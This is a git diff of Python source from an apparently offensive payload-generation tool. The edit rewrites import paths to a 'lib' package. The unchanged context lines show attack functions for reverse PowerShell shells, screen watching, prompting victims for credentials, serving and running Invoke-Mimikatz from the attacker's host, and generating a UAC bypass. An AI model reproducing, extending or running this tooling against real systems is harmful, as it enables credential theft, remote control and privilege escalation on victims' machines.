@@ -1,10 +1,10 @@
-from main import *
-from payloadextras import *
-from startmetasploit import *
-from generatepayload import *
+from lib.main import *
+from lib.payloadextras import *
+from lib.startmetasploit import *
+from lib.generatepayload import *
 
 def reverseIpAndPort(port):
-    from menu import returnIP
+    from lib.menu import returnIP
     portnum = input(
         '\n[*] Press Enter For Default Port(%s)\n[*] Port> '%(t.bold_green + port + t.normal))
     if len(portnum) is 0:
@@ -96,7 +96,7 @@ def reversePowerShellWatchScreenGeneration(payloadchoice,payloadname):
 def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
     print(payloadchoice)
     clientnumber = int(clientUpload(payloadchoice(), isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"true", "multiple":"false"}'))
-    from stager import returnServerList
+    from lib.stager import returnServerList
     try:
         for server in returnServerList():
             while True:
@@ -112,12 +112,12 @@ def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
 
 
 def reversePowerShellInvokeMimikatzGeneration(payloadchoice,payloadname):
-    from menu import returnIP
+    from lib.menu import returnIP
     moduleport = FUNCTIONS().randomUnusedPort()
     FUNCTIONS().DoServe(returnIP(), "", "./externalmodules", port = moduleport, printIt = False)
     powershellScript = payloadchoice % (returnIP(), moduleport)
     clientnumber = int(clientUpload(payloadchoice(), isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"true", "multiple":"false"}'))
-    from stager import returnServerList
+    from lib.stager import returnServerList
     try:
         for server in returnServerList():
             while True:
@@ -131,7 +131,7 @@ def reversePowerShellInvokeMimikatzGeneration(payloadchoice,payloadname):
     return "pass"
 
 def UACBypassGeneration(payloadchoice,payloadname):
-    from menu import returnIP
+    from lib.menu import returnIP
     moduleport = FUNCTIONS().randomUnusedPort()
     FUNCTIONS().DoServe(returnIP(), "", "./externalmodules", port = moduleport, printIt = False)
     encoded = printListener(False, True)
